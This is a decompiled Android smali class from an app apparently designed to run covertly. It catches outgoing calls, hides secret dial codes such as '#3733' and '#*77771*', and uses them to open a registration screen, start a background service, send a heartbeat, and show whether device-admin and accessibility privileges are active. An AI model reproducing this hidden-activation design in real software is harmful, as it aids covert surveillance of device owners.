.class public Lcom/hp/vd/DialActivatorBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "DialActivatorBroadcastReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 24
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 30
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/DialActivatorBroadcastReceiver;->process(Landroid/content/Context;Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 33
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method protected process(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 6

    .line 40
    invoke-virtual {p0}, Lcom/hp/vd/DialActivatorBroadcastReceiver;->abortBroadcast()V

    .line 43
    invoke-virtual {p0}, Lcom/hp/vd/DialActivatorBroadcastReceiver;->getResultData()Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    const-string v0, "android.intent.extra.PHONE_NUMBER"

    .line 47
    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :cond_0
    if-nez v0, :cond_1

    return-void

    :cond_1
    const-string p2, "#3733"

    .line 57
    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    const/4 v1, 0x0

    if-eqz p2, :cond_2

    invoke-static {p1}, Lcom/hp/vd/agent/InstallHelper;->isInstalledCompletely(Landroid/content/Context;)Z

    move-result p2

    if-nez p2, :cond_2

    .line 59
    invoke-virtual {p0, v1}, Lcom/hp/vd/DialActivatorBroadcastReceiver;->setResultData(Ljava/lang/String;)V

    .line 62
    new-instance p2, Landroid/content/Intent;

    const-class v1, Lcom/hp/vd/RegisterActivity;

    invoke-direct {p2, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "extra_phone"

    .line 63
    invoke-virtual {p2, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v0, 0x10000000

    .line 64
    invoke-virtual {p2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 66
    invoke-virtual {p1, p2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :cond_2
    const-string p2, "#*77771*"

    .line 78
    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    const/4 v2, 0x1

    if-eqz p2, :cond_3

    .line 79
    invoke-static {p1}, Lcom/hp/vd/agent/InstallHelper;->isInstalledCompletely(Landroid/content/Context;)Z

    move-result p2

    .line 80
    const-class v0, Lcom/hp/vd/ServiceMain;

    invoke-static {p1, v0}, Lcom/hp/vd/agent/InstallHelper;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    const-string v1, "device_policy"

    .line 81
    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    .line 82
    new-instance v3, Landroid/content/ComponentName;

    const-class v4, Lcom/hp/vd/agent/DeviceAdminHandler;

    invoke-direct {v3, p1, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 83
    invoke-virtual {v1, v3}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    .line 84
    const-class v3, Lcom/hp/vd/MainAccesssibilityService;

    invoke-virtual {v3}, Ljava/lang/Class;->getCanonicalName()Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v3}, Lcom/hp/vd/agent/InstallHelper;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v3

    .line 86
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Installed: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string p2, ", Running: "

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string p2, ", Device Admin: "

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string p2, ", Accessibility Service: "

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    .line 87
    invoke-static {p1, p2, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    return-void

    :cond_3
    const-string p2, "#*77772*"

    .line 95
    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_6

    .line 98
    invoke-static {p1}, Lcom/hp/vd/agent/InstallHelper;->isInstalledCompletely(Landroid/content/Context;)Z

    move-result p2

    if-nez p2, :cond_4

    const-string p2, "Application is not installed. You must install it first."

    goto :goto_0

    .line 102
    :cond_4
    const-class p2, Lcom/hp/vd/ServiceMain;

    invoke-static {p1, p2}, Lcom/hp/vd/agent/InstallHelper;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p2

    if-eqz p2, :cond_5

    const-string p2, "Service is running. It won\'t be rescheduled."

    goto :goto_0

    .line 106
    :cond_5
    new-instance p2, Lcom/hp/vd/AlarmRoutine;

    new-instance v0, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v0}, Lcom/hp/vd/agent/Configuration;-><init>()V

    invoke-direct {p2, p1, v1, v0}, Lcom/hp/vd/AlarmRoutine;-><init>(Landroid/content/Context;Landroid/content/Intent;Lcom/hp/vd/agent/Configuration;)V

    .line 112
    invoke-virtual {p2}, Lcom/hp/vd/AlarmRoutine;->dispatchOnInstall()V

    const-string p2, "The application should be running as you read this."

    .line 118
    :goto_0
    invoke-static {p1, p2, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    return-void

    :cond_6
    const-string p2, "#*77773*"

    .line 126
    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_7

    const-string p2, "Heartbeat dispatched."

    .line 129
    new-instance v0, Lcom/hp/vd/starter/FallbackStarter;

    invoke-direct {v0}, Lcom/hp/vd/starter/FallbackStarter;-><init>()V

    .line 130
    invoke-virtual {v0, p1}, Lcom/hp/vd/starter/FallbackStarter;->heartbeat(Landroid/content/Context;)V

    .line 132
    invoke-static {p1, p2, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    return-void

    :cond_7
    return-void
.end method
